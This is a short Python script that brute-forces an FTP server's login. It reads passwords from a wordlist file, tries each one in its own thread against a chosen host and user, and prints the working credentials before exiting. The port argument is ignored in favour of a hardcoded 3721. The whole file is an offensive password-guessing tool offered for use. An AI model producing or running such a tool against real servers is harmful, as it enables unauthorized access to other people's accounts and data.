from ftplib import FTP
import sys
import threading
import os

def recursive(password, host, user, port):
	try:
		ftp = FTP()
		ftp.connect(host, 3721)
		ftp.login(user,password)
		print("-" * 50)
		print('Username \t:', user)
		print('Password \t:', password)
		print('Host \t\t:', host)
		print("-" * 50)
		os._exit(1)
	except:
		sys.exit(0) 

def main(host, user, file, port = 21):
	with open(file,'r') as infile:
		for line in infile:
			password = line.strip('\r\n')
			print ("[-] "+ str(password), end="\r")
			t = threading.Thread(target=recursive, args=(password, host, user, port))
			t.start()